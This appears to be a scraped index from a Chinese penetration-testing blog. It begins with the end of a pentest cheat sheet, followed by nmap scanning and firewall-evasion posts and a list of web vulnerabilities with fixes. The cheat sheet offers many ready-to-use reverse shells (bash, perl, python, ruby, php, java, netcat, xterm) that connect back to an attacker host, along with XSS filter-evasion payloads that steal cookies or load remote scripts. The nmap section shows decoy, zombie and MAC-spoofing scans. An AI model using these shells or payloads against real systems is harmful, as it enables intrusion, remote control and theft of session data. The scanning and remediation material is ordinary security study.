\\xeb\\xc4 (jump backward -60) buff=lxxllxxl+shell !mona egg -t &apos;w00t&apos; GDB Debugger Commands# Setting Breakpoint break *_start # Execute Next Instruction next step n s # Continue Execution continue c # Data checking &apos;REGISTERS&apos; and &apos;MEMORY&apos; # Display Register Values: (Decimal,Binary,Hex) print /d –&gt; Decimal print /t –&gt; Binary print /x –&gt; Hex O/P : (gdb) print /d $eax $17 = 13 (gdb) print /t $eax $18 = 1101 (gdb) print /x $eax $19 = 0xd (gdb) # Display values of specific memory locations command : x/nyz (Examine) n –&gt; Number of fields to display ==&gt; y –&gt; Format for output ==&gt; c (character) , d (decimal) , x (Hexadecimal) z –&gt; Size of field to be displayed ==&gt; b (byte) , h (halfword), w (word 32 Bit) BASH Reverse Shellbash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1 exec /bin/bash 0&amp;0 2&gt;&amp;0 exec /bin/bash 0&amp;0 2&gt;&amp;0 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196 exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done /bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1 /bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1 PERL Reverse Shellperl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; # for win platform perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos; perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};’ RUBY Reverse Shellruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos; # for win platform ruby -rsocket -e &apos;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos; ruby -rsocket -e &apos;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; PYTHON Reverse Shellpython -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP Reverse Shellphp -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; JAVA Reverse Shellr = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor() NETCAT Reverse Shellnc -e /bin/sh attackerip 4444 nc -e /bin/sh 192.168.37.10 443 # If the -e option is disabled, try this # mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe /bin/sh | nc attackerip 443 rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/ # If you have the wrong version of netcat installed, try rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f TELNET Reverse Shell# If netcat is not available or /dev/tcp mknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe XTERM Reverse Shell# Start an open X Server on your system (:1 – which listens on TCP port 6001) apt-get install xnest Xnest :1 # Then remember to authorise on your system the target IP to connect to you xterm -display 127.0.0.1:1 # Run this INSIDE the spawned xterm on the open X Server xhost +targetip # Then on the target connect back to the your X Server xterm -display attackerip:1 /usr/openwin/bin/xterm -display attackerip:1 or $ DISPLAY=attackerip:0 xterm XSS Cheat Codeshttps://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;) &lt;script&gt;document.location=http://IP:PORT&lt;/script&gt; &apos;;alert(String.fromCharCode(88,83,83))//\\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt; &quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;{()} &lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt; &lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt; &lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt; &lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt; &lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt; &lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt; perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\\&quot;XSS\\&quot;)&gt;&quot;;&apos; &gt; out &lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\\]^`=alert(&quot;XSS&quot;)&gt; (&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;) &lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt; &lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt; &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt; %253cscript%253ealert(document.cookie)%253c/script%253e &quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt; %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E &lt;img src=asdf onerror=alert(document.cookie)&gt; SSH Over SCTP (With Socat)# on remote server # assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP $ socat SCTP-LISTEN:80,fork TCP:localhost:22 # localhost # replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :) $ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80 # create socks proxy # replace username and -p port value as needed... $ ssh -lusername localhost -D 8080 -p 1337 Install Metasploit Community Edition in Kali 2.0# github urls https://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Version wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run &amp;&amp; chmod +x metasploit-latest-linux-x64-installer.run &amp;&amp; ./metasploit-latest-linux-x64-installer.run # create user $ /opt/metasploit/createuser [*] Please enter a username: root [*] Creating user &apos;root&apos; with password &apos;LsRRV[I^5&apos; ... # activate your metasploit license https://localhost:3790 # update metasploite $ /opt/metasploit/app/msfupdate # use msfconsole $ /opt/metasploit/app/msfconsole https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"nmap最佳扫描策略","slug":"nmap最佳扫描策略","date":"2017-04-10T08:44:40.000Z","updated":"2017-04-11T06:16:44.684Z","comments":true,"path":"2017/04/10/nmap最佳扫描策略/","link":"","permalink":"http://airs-sec.com/2017/04/10/nmap最佳扫描策略/","excerpt":"之前有一篇，nmap基本使用总结，都是一些基础的命令。 namp作为一款神器，如何使用好nmap很重要，特别是对于前期信息手机阶段。见过很多人，在信息收集阶段讨厌使用namp，而选择其他的扫描工具，但我觉得，工欲善其事，必先利其器，任何工具，只要熟悉和去摸索，都能很好的去使用。 通过nmap的最佳扫描策略，我们可以更搞笑的去使用nmap进行信息收集。","text":"之前有一篇，nmap基本使用总结，都是一些基础的命令。 namp作为一款神器，如何使用好nmap很重要，特别是对于前期信息手机阶段。见过很多人，在信息收集阶段讨厌使用namp，而选择其他的扫描工具，但我觉得，工欲善其事，必先利其器，任何工具，只要熟悉和去摸索，都能很好的去使用。 通过nmap的最佳扫描策略，我们可以更搞笑的去使用nmap进行信息收集。 适用于所有规模大小的网络的扫描策略1234567891011121314151617181920212223#扫描整个C段#$ nmap -sn -T4 -oG discovery.gnmap 192.168.123.1/24Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:12 CSTNmap scan report for 192.168.123.1Host is up (0.0024s latency).Nmap scan report for 192.168.123.80Host is up (0.00038s latency).Nmap scan report for 192.168.123.135Host is up (0.0098s latency).Nmap scan report for 192.168.123.215Host is up (0.093s latency).Nmap done: 256 IP addresses (4 hosts up) scanned in 2.53 seconds# 扫描结果$ cat discovery.gnmap # Nmap 7.01 scan initiated Mon Apr 10 20:12:54 2017 as: nmap -sn -T4 -oG discovery.gnmap 192.168.123.1/24Host: 192.168.123.1 () Status: UpHost: 192.168.123.80 () Status: UpHost: 192.168.123.135 () Status: UpHost: 192.168.123.215 () Status: Up# Nmap done at Mon Apr 10 20:12:57 2017 -- 256 IP addresses (4 hosts up) scanned in 2.53 seconds 12345678#对上述的扫描结果，过滤扫描中存活的主机$ grep \"Status: Up\" discovery.gnmap | cut -f 2 -d\" \" &gt; livehost.txt$ cat livehost.txt 192.168.123.1192.168.123.80192.168.123.135192.168.123.215 过滤出存活的主机之后，就可以开始扫描了。 12345678# http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf#加载文件中的存活主机进行扫描$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt#oN：为输出成normal格式#oG：为输出成Grepable格式 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110#探测tcp端口与服务$ sudo nmap -sS -Pn -T4 -oG TopTCP -iL livehost.txt [sudo] password for airs: Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:18 CSTNmap scan report for 192.168.123.1Host is up (0.0028s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh53/tcp open domain80/tcp open httpMAC Address: 8C:AB:8E:D7:13:D1 (Shanghai Feixun Communication)Nmap scan report for 192.168.123.135Host is up (0.0048s latency).All 1000 scanned ports on 192.168.123.135 are closedMAC Address: 84:73:03:EA:35:81 (Letv Mobile and Intelligent Information Technology (Beijing))Nmap scan report for 192.168.123.215Host is up (0.0043s latency).Not shown: 998 closed portsPORT STATE SERVICE8081/tcp open blackice-icecap9003/tcp open unknownMAC Address: 0C:1D:AF:E3:13:3A (Xiaomi Communications)Nmap scan report for 192.168.123.80Host is up (0.000014s latency).Not shown: 997 closed portsPORT STATE SERVICE80/tcp open http81/tcp open hosts2-ns8000/tcp open http-altNmap done: 4 IP addresses (4 hosts up) scanned in 54.86 seconds---# 探测udp端口与服务sudo nmap -sU -Pn -T4 -oN TopUDP -iL livehost.txt Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:20 CSTWarning: 192.168.123.135 giving up on port because retransmission cap hit (6).Warning: 192.168.123.1 giving up on port because retransmission cap hit (6).Warning: 192.168.123.215 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.123.1Host is up (0.0018s latency).Not shown: 979 closed portsPORT STATE SERVICE53/udp open domain67/udp open|filtered dhcps774/udp open|filtered acmaint_dbd998/udp open|filtered puparp1031/udp open|filtered iad21081/udp open|filtered pvuniwien1719/udp open|filtered h323gatestat1900/udp open|filtered upnp11487/udp open|filtered unknown16829/udp open|filtered unknown17282/udp open|filtered unknown17615/udp open|filtered unknown21383/udp open|filtered unknown25709/udp open|filtered unknown25931/udp open|filtered unknown34855/udp open|filtered unknown37843/udp open|filtered unknown44179/udp open|filtered unknown46093/udp open|filtered unknown49152/udp open|filtered unknown49220/udp open|filtered unknownMAC Address: 8C:AB:8E:D7:13:D1 (Shanghai Feixun Communication)Nmap scan report for 192.168.123.135Host is up (0.064s latency).Not shown: 986 closed portsPORT STATE SERVICE1008/udp open|filtered ufsd1485/udp open|filtered lansource4444/udp open|filtered krb52417585/udp open|filtered unknown19663/udp open|filtered unknown23965/udp open|filtered unknown25003/udp open|filtered icl-twobase432385/udp open|filtered unknown32777/udp open|filtered sometimes-rpc1842431/udp open|filtered unknown49169/udp open|filtered unknown49182/udp open|filtered unknown54094/udp open|filtered unknown61142/udp open|filtered unknownMAC Address: 84:73:03:EA:35:81 (Letv Mobile and Intelligent Information Technology (Beijing))Nmap scan report for 192.168.123.215Host is up (0.054s latency).All 1000 scanned ports on 192.168.123.215 are closed (973) or open|filtered (27)MAC Address: 0C:1D:AF:E3:13:3A (Xiaomi Communications)Nmap scan report for 192.168.123.80Host is up (0.0000070s latency).Not shown: 995 closed portsPORT STATE SERVICE68/udp open|filtered dhcpc123/udp open ntp631/udp open|filtered ipp1900/udp open|filtered upnp5353/udp open|filtered zeroconfNmap done: 4 IP addresses (4 hosts up) scanned in 1080.60 seconds 12345#扫描所有的端口，UDP扫描可能变的非常慢$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt 1234#通过从文本过滤，发现tcp和udp端口$ grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘&#123;print “T:”$0&#125;’$ grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘&#123;print “U:”$0&#125;’ 12345探测服务/操作系统版本$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt 12345678910111213141516171819202122232425262728293031323334353637#服务探测$ nmap -sV -T4 -Pn -oG ServiceDetect -iL livehost.txt Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:30 CSTNmap scan report for 192.168.123.1Host is up (0.015s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh Dropbear sshd 2016.74 (protocol 2.0)53/tcp open domain dnsmasq 2.7680/tcp open http Asus RT-AC54U WAP http configService Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel, cpe:/h:asus:rt-ac54uNmap scan report for 192.168.123.80Host is up (0.000044s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.25 ((Debian))81/tcp open http Apache httpd 2.4.258000/tcp open http WebFS httpd 1.21Service Info: Host: 127.0.1.1Nmap scan report for 192.168.123.135Host is up (0.013s latency).All 1000 scanned ports on 192.168.123.135 are closedNmap scan report for 192.168.123.215Host is up (0.012s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION8081/tcp open blackice-icecap?9003/tcp open unknownService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 4 IP addresses (4 hosts up) scanned in 149.54 seconds 绕防火墙下面的图是在windows7上开启了防火墙，可以看到ping不通 分片123456789101112131415161718192021airs@airs-sec ~ $ sudo nmap -f 192.168.56.9[sudo] password for airs: Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:36 CSTNmap scan report for 192.168.56.9Host is up (0.00019s latency).All 1000 scanned ports on 192.168.56.9 are filteredMAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 21.37 secondsairs@airs-sec ~ $ sudo nmap -f -sS -sV 192.168.56.9Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:37 CSTNmap scan report for 192.168.56.9Host is up (0.00019s latency).All 1000 scanned ports on 192.168.56.9 are filteredMAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 21.72 seconds 上述输出结果可以看到，可以探测主机存活，但探测不到服务 MTU 修改默认的MTU的大小，MTU的大小必须为（8, 16, 24, 32, 等） 1$ nmap –mtu 24 1234567891011121314$ sudo nmap -mtu 24 -sS -sV -O 192.168.56.9Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:49 CSTNmap scan report for 192.168.56.9Host is up (0.00011s latency).All 1000 scanned ports on 192.168.56.9 are filteredMAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)Too many fingerprints match this host to give specific OS detailsNetwork Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.39 seconds#探测不了服务和版本 产生随机欺骗字符1$ nmap -D RND:10 [target] 123456789101112$ sudo nmap -D RND:10 -sS -sV -O 192.168.56.9Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:50 CSTNmap scan report for 192.168.56.9Host is up (0.00019s latency).All 1000 scanned ports on 192.168.56.9 are filteredMAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)Too many fingerprints match this host to give specific OS detailsNetwork Distance: 1 hopOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.48 seconds 手动指定ip地址伪造请求1$ nmap -D decoy1,decoy2,decoy3 etc. 僵尸网络扫描，首先需要找到僵尸网络IP1$ nmap -sI [Zombie IP] [Target IP] 指定源端1nmap --source-port 80 IP 扫描完成后，添加随机数据1$ nmap --data-length 25 IP MAC地址欺骗，可以生成不同的主机MAC地址1$ nmap --spoof-mac Dell/Apple/3Com IP","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://airs-sec.com/tags/nmap/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"nmap基本使用总结","slug":"nmap基本使用总结","date":"2017-04-01T11:00:54.000Z","updated":"2017-04-02T15:13:22.704Z","comments":true,"path":"2017/04/01/nmap基本使用总结/","link":"","permalink":"http://airs-sec.com/2017/04/01/nmap基本使用总结/","excerpt":"总结了一些nmap常用命令","text":"总结了一些nmap常用命令 基本的扫描功能1.1 扫描存活的主机，ping扫描nmap -sP 192.168.56.102 1.2 从文本中读取ip地址，并扫描端口和指定服务nmap -p80,22,23 -sV -iL testip.txt 1.3 只扫描开放的端口 nmap -p80,8080,22 –open 192.168.56.102 1.4 不使用反向解析(-n),扫描80端口开放的主机，同时保存为xml文件 nmap -n -p80 -iL testip.txt -sV -oX testip.xml 1.5 扫描一台主机的操作系统 sudo nmap -O 192.168.56.102 1.6 不检测存活主机，进行全端口扫描 nmap -Pn -A -p1-65535 -sV 192.168.56.102 1.7扫描mysql的弱口令 nmap -p3306 –script=mysql-empty-password.nse 192.168.56.102 1.8 无ping扫描，不pingp0 1.9 PS/PU/PA,SYN/UDP/ACK ping扫描 1.10 跟踪路由并扫描 sudo nmap -v –traceroute 192.168.56.102 1.11 sS/sT/sU,syn,tcp,udp连接扫描 1.12隐蔽扫描 sN/sF/sX,NULL/FIN/Xmas扫描 1.13操作系统版本探测 nmap -sV 192.168.56.102 1.14 绕过防火墙和ids的检测 -f:绕防火墙 -D:指定多个ip地址,或者使用RND随机生成几个地址,在指定的诱饵之间使用逗号进行分割 1.15 smb-check-vulns.nse 系统漏洞扫描 1.16 nmap保存与输出 标准格式保存nmap -oN -sS test.txt 192.168.56.102 以xml的格式进行保存nmap -oX sS test.xml 192.168.56.102 Nmap Full Web Vulnerable Scan利用脚本进行扫描12345678910111213wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gznmap -sS -sV --script=vulscan/vulscan.nse targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv targetnmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 targetnmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 targetnmap -sV --script=vuln targetnmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"nmap","slug":"nmap","permalink":"http://airs-sec.com/tags/nmap/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"web漏洞描述以及修复建议","slug":"web漏洞描述以及修复建议","date":"2017-03-23T13:52:55.000Z","updated":"2018-07-10T01:43:08.082Z","comments":true,"path":"2017/03/23/web漏洞描述以及修复建议/","link":"","permalink":"http://airs-sec.com/2017/03/23/web漏洞描述以及修复建议/","excerpt":"相关 http://wiki.open.qq.com/wiki/Web%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%8F%8A%E4%BF%AE%E5%A4%8D https://book.thief.one/ 内容均来自互联网，风险等级根据实际情况定义","text":"相关 http://wiki.open.qq.com/wiki/Web%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%8F%8A%E4%BF%AE%E5%A4%8D https://book.thief.one/ 内容均来自互联网，风险等级根据实际情况定义 sql注入风险等级:高危 1.漏洞描述** SQL注入攻击是黑客对数据库进行攻击的常用手段之一。 随着B/S模式应用开发的发展，使用这种模式编写应用程序的程序员也越来越多。但是由于程序员的水平及经验也参差不齐，相当大一部分程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，导致Web程序代码中对于用户提交的参数未做过滤就直接放到SQL语句中执行，导致参数中的特殊字符打破了SQL语句原有逻辑，黑客可以利用该漏洞执行任意SQL语句。这就是SQL注入。 2.解决建议 1)使用参数化查询，对进入数据库中的语句进行转义处理，数据类型确定，编码统一，做好过滤防护工作，避免网站显示SQL错误信息。 2)部署Web应用防火墙；（设备层） 3)对数据库操作进行监控。（数据库层） 3.漏洞危害： 机密数据被窃取； 核心业务数据被篡改； 网页被篡改； 数据库所在服务器被攻击从而变为傀儡主机，导致局域网(内网)被入侵。 xss跨站风险等级:高危 1.漏洞描述 跨站脚本攻击（也称为XSS）指利用网站漏洞从用户那里恶意盗取信息，恶意用户可以使用该漏洞来模拟其他用户身份登录，更甚至可以修改呈现给其他用户的内容。 用户在浏览网站、使用即时通讯软件、甚至在阅读电子邮件时，通常会点击其中的链接。攻击者通过在链接中插入恶意代码，就能够盗取用户信息或在终端用户系统上执行恶意代码。 2.解决建议 1)推荐措施包括实施安全编程技术确保正确过滤用户提供的数据，并编码所有用户提供的数据以防以可执行的格式向终端用户发送注入的脚本。 12PHP: string htmlspecialchars (string string [,int quote_style])ASP/ASP.NET: Server.HTMLEncode (strHTML String) 2)确保web应用对所有输入参数（cookies、头、查询字符串、表单、隐藏字段等）验证严格定义的预期结果。 3)检查POST和GET请求的响应，确保返回内容是预期的且有效。 4)对所有输入输出做限制，避免出现如script，iframe等字样，不仅在客户端做验证与过滤，服务端更加需要验证和过滤，并且统一编码格式，做好转义处理。 链接注入风险等级:中危 1.漏洞描述 “链接注入”是修改站点内容的行为，其方式为将外部站点的URL嵌入其中，或将有易受攻击的站点中的脚本的URL嵌入其中。将URL嵌入易受攻击的站点中，攻击者便能够以它为平台来启动对其他站点的攻击，以及攻击这个易受攻击的站点本身。 2.漏洞危害 1)可能会引诱初级用户提供诸如用户名、密码、信用卡号、社会保险号等敏感信息 2)可能会窃取或操纵客户会话和cookie，可能用于模仿合法用户，从而使黑客能够以该用户身份查看或变更用户记录以及执行事务。 3)可能会在Web服务器上上载、修改或删除Web页面、脚本和文件。 3.解决建议 对用户输入内容进行过滤。 通过验证用户输入不能包含危险字符，防止恶意的用户执行应用程序执行计划外的任务， 例如：启动任意SQL查询、嵌入将在客户端执行的Javascript代码、运行各种操作系统命令，等等。 LDAP注入漏洞风险等级:高危 1.漏洞描述： LDAP是一种轻量级目录访问协议，可以用来保存信息。如果在查询语句中插入恶意代码，可以修改返回的结果 2.漏洞危害： 1)机密数据被窃取； 3.修复建议： 1)在查询中对用户输入的数据进行严格过滤； 2)部署Web应用防火墙； 命令执行漏洞风险等级:高危 1.漏洞描述： 命令执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令的代码中，对恶意构造的语句，可被用来执行任意命令。 2.漏洞危害： 黑客可在服务器上执行任意命令，写入后门，从而入侵服务器，获取服务器的管理员权限，危害巨大。 3.修复建议： 严格过滤用户输入的数据，禁止执行系统命令 短文件名泄漏漏洞1.漏洞描述 该漏洞由于Windows处理较长文件名时为方便使用较短的文件名代替，攻击者可利用该漏洞尝试获取网站服务器下的文件名。 2.漏洞危害 黑客可通过该漏洞尝试获取网站服务器下存放文件的文件名，达到获取更多信息来入侵服务器的目的。 3.修复建议 修改Windows配置，关闭短文件名功能。 部署Web应用防火墙，防止攻击者批量尝试。 URL存在框架注入漏洞风险等级:中危 1.漏洞描述 攻击者有可能注入含有恶意内容的 frame 或 iframe标记。 如果用户不够谨慎，就有可能浏览该标记，却意识不到自己会离开原始站点而进入恶意的站点。之后，攻击者便可以诱导用户再次登录，然后获取其登录凭证。 2.解决建议 建议过滤出所有以下字符： 123456789101112131415161718192021222324252627282930313233[1] |（竖线符号）[2] &amp; （&amp; 符号）[3] ;（分号）[4] $（美元符号）[5] %（百分比符号）[6] @（at符号）[7] &apos;（单引号）[8] &quot;（引号）[9] \\&apos;（反斜杠转义单引号）[10] \\&quot;（反斜杠转义引号）[11] &lt;&gt;（尖括号）[12] ()（括号）[13] +（加号）[14] CR（回车符，ASCII 0x0d）[15] LF（换行，ASCII 0x0a）[16] ,（逗号）[17] \\（反斜杠） 敏感信息泄露风险等级:中危 1.漏洞描述 由于网站管理员缺乏足够的安全意识或者配置不当，造成一些敏感信息泄露，黑客可以通过这些信息进行下一步攻击。 2.漏洞危害 攻击者可直接下载用户的相关信息，包括网站的绝对路径、用户的登录名、密码、真实姓名、身份证号、电话号码、邮箱、QQ号等； 攻击者通过构造特殊URL地址，触发系统web应用程序报错，在回显内容中，获取网站敏感信息； 攻击者利用泄漏的敏感信息，获取网站服务器web路径，为进一步攻击提供帮助； robots文件暴露web站点结构，黑客可通过此信息进行下一步攻击； 管理入口地址暴露，黑客可通过此信息进行下一步攻击。 3.解决建议 对网站错误信息进行统一返回，模糊化处理； 对存放敏感信息的文件进行加密并妥善储存，避免泄漏敏感信息。 目录遍历风险等级:中危 1.漏洞描述 目录遍历漏洞是由于Web服务器设置不当导致的，攻击者可利用此漏洞查看Web目录下的文件及其文件夹，从而找到可攻击的文件。该漏洞一般被攻击者作为辅助攻击的手段之一。 由于网站管理员对服务器或CMS配置不当，导致目录可被遍历，黑客可以获知整个网站的结构。 2.解决建议 